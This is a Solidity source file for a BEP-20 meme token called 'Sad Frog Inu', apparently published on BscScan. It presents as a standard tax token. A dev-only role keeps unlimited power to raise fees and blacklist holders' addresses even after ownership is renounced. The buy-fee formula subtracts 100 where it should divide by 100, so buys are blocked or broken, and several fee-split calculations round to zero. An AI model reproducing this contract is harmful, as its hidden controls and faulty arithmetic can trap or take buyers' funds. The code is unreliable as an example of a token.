/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.10;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}


interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}


interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract SadFrogInu is Context, Ownable, IERC20 {
    using SafeMath for uint256;

    address private _owner;

    mapping(address => uint256) private _tOwned; 
    mapping(address => mapping(address => uint256)) private _allowances; 
    mapping(address => bool) private _isExcludedFromFee; 
    mapping(address => bool) private _isExcludedFrommaxTransferLimit; 
    mapping(address => bool) private _isExcludedFrommaxWalletToken; 
    mapping(address => bool) private _isBlacklist; 

    bool private _ismaxTransferLimitValid = true;

    uint256 private constant MAX = ~uint256(0);
    string private _name = "Sad Frog Inu"; 
    string private _symbol = "sFGI"; 
    uint8 private _decimals = 18; 
    uint256 private _tTotal = 10**15 * 10**_decimals;
   
    uint256 private _Tax_On_Buy = 5; 
    uint256 private _Tax_On_Sell = 5; 
    uint256 private Percent_Marketing = 60; 
    uint256 private Percent_Dev = 20; 
    uint256 private Percent_Burn = 0; 
    uint256 private Percent_AutoLP = 20; 

    address payable public Wallet_Marketing = payable(0xC251213742FD35994E8936f34F752FC67226877a); 
    address payable public Wallet_Dev = payable(0x6a58aD29686feB7CA344F4b041c80bcACba18741);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);
 
    uint256 private maxTransferingAmount = _tTotal.div(100); 
    uint256 private maxWalletToken = _tTotal.div(20); 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 

    IDexRouter public dexRouter; 
    address public dexPair; 
    bool private inSwapAndLiquify;
    bool private swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped, 
        uint256 ethReceived, 
        uint256 tokensIntoLiqudity 
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    modifier onlyDev {
        require(_msgSender() == Wallet_Dev, "Caller is not the dev");
        _;
    }

    receive() external payable {}

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;

         //mainnet
        //IDexRouter _dexRouter = IDexRouter(
        //     0x10ED43C718714eb63d5aA57B78B54704E256024E
        // );
        //Testnet
        IDexRouter _dexRouter = IDexRouter(
             0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        );
        dexPair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );

        dexRouter = _dexRouter;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true;
        _isExcludedFromFee[Wallet_Dev] = true;
        _isExcludedFromFee[Wallet_Burn] = true;
        
        _isExcludedFrommaxTransferLimit[owner()] = true;
        _isExcludedFrommaxTransferLimit[address(this)] = true;
        _isExcludedFrommaxTransferLimit[Wallet_Marketing] = true;
        _isExcludedFrommaxTransferLimit[Wallet_Dev] = true;
        _isExcludedFrommaxTransferLimit[Wallet_Burn] = true;
        _isExcludedFrommaxTransferLimit[dexPair] = true;

        _isExcludedFrommaxWalletToken[owner()] = true;
        _isExcludedFrommaxWalletToken[address(this)] = true;
        _isExcludedFrommaxWalletToken[Wallet_Marketing] = true;
        _isExcludedFrommaxWalletToken[Wallet_Dev] = true;
        _isExcludedFrommaxWalletToken[Wallet_Burn] = true;
        _isExcludedFrommaxWalletToken[dexPair] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address _account)
        public
        view
        override
        returns (uint256)
    {
        return _tOwned[_account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue)
        );
        return true;
    }

    function isExcludedFromFee(address _account) public view returns (bool) {
        return _isExcludedFromFee[_account];
    }

    function isExcludedFrommaxTransferLimit(address _account)
        public
        view
        returns (bool)
    {
        return _isExcludedFrommaxTransferLimit[_account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERC20:zero address");
        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0) && to != address(0), "ERC20: Using zero address");
        require(amount > 0, "Token value must be higher than zero");  
        require(!_isBlacklist[from], "The address was blacklisted");
        require(!_isBlacklist[to], "The address was blacklisted");

        if (_ismaxTransferLimitValid) {
            if (!_isExcludedFrommaxTransferLimit[to]) {
                require(maxTransferingAmount >= amount, "Over transaction limit");
            }
        }
        
        if (!_isExcludedFrommaxWalletToken[to]) {
            uint256 heldTokens = balanceOf(to);
            require(maxWalletToken >= (heldTokens + amount), "Over wallet limit");
        }

        if (
            txCount >= swapTrigger &&
            !inSwapAndLiquify &&
            from != dexPair &&
            swapAndLiquifyEnabled
            )
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            txCount = 0;
            swapAndLiquify(contractTokenBalance);
        }

        bool takeFee = true;
        bool isBuy;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        } else {
            if (from == dexPair) {
                isBuy = true;
            }

            txCount++;
        }

        _tokenTransfer(from, to, amount, takeFee, isBuy);

    }

    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 tokens_to_Burn = contractTokenBalance * Percent_Burn.div(100);
        _tTotal = _tTotal - tokens_to_Burn;
        _tOwned[Wallet_Burn] = _tOwned[Wallet_Burn] + tokens_to_Burn;
        _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn;

        uint256 tokens_to_M = contractTokenBalance * Percent_Marketing.div(100);
        uint256 tokens_to_D = contractTokenBalance * Percent_Dev.div(100);
        uint256 tokens_to_LP_Half = contractTokenBalance * Percent_AutoLP.div(200);

        uint256 balanceBeforeSwap = address(this).balance;
        swapTokensForBNB(tokens_to_LP_Half + tokens_to_M + tokens_to_D);
        uint256 BNB_Total = address(this).balance - balanceBeforeSwap;

        uint256 split_M = Percent_Marketing.mul(100).div(Percent_AutoLP + Percent_Marketing + Percent_Dev);
        uint256 BNB_M = BNB_Total * split_M.div(100);

        uint256 split_D = Percent_Dev.mul(100).div(Percent_AutoLP + Percent_Marketing + Percent_Dev);
        uint256 BNB_D = BNB_Total * split_D.div(100);

        addLiquidity(tokens_to_LP_Half, (BNB_Total.sub(BNB_M).sub(BNB_D)));
        emit SwapAndLiquify(tokens_to_LP_Half, (BNB_Total.sub(BNB_M).sub(BNB_D)), tokens_to_LP_Half);

        sendToWallet(Wallet_Marketing, BNB_M);
        BNB_Total = address(this).balance;
        sendToWallet(Wallet_Dev, BNB_Total);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            Wallet_Burn,
            block.timestamp
        );
    }

    function  _tokenTransfer(
        address sender, 
        address recipient,
         uint256 tAmount, 
         bool takeFee, 
         bool isBuy
    ) private {
        if (!takeFee) {
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            _tOwned[recipient] = _tOwned[recipient].add(tAmount);
            
            emit Transfer(sender, recipient, tAmount);

            if (recipient == Wallet_Burn) {
                _tTotal = _tTotal.sub(tAmount);
            }

        } else if (isBuy) {
            uint256 buyFEE = tAmount.mul(_Tax_On_Buy).sub(100);
            uint256 tTransferAmount = tAmount.sub(buyFEE) ;

            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
            _tOwned[address(this)] = _tOwned[address(this)].add(buyFEE);

            emit Transfer(sender, recipient, tTransferAmount);

            if (recipient == Wallet_Burn) {
                _tTotal = _tTotal.sub(tTransferAmount);
            }

        } else {
            
            uint256 sellFEE = tAmount.mul(_Tax_On_Sell).div(100);
            uint256 tTransferAmount = tAmount.sub(sellFEE);
            
            _tOwned[sender] = _tOwned[sender].sub(tAmount);
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
            _tOwned[address(this)] = _tOwned[address(this)].add(sellFEE);

            emit Transfer(sender, recipient, tTransferAmount);

            if (recipient == Wallet_Burn) {
                _tTotal = _tTotal.sub(tTransferAmount);
            }

        }

    }

    function setFee(uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {
        _Tax_On_Buy = taxFeeOnBuy;
        _Tax_On_Sell = taxFeeOnSell;
    }

    function setExcludedFromFee(address account) public onlyDev {
        _isExcludedFromFee[account] = true;
    }

    function setBlacklist(address account) public onlyDev {
        _isBlacklist[account] = true;
    }

    function removeBlacklist(address account) public onlyDev {
        _isBlacklist[account] = false;
    }

    function liftingTradingLimits() public onlyDev {
        _ismaxTransferLimitValid = false;
    }

    function burn(uint256 value) public {
        require(_msgSender() != address(0), "ERC20: burn from the zero address");

        address account = _msgSender();
        _tTotal = _tTotal.sub(value);
        _tOwned[account] = _tOwned[account].sub(value);

        emit Transfer(account, Wallet_Burn, value);

    }

}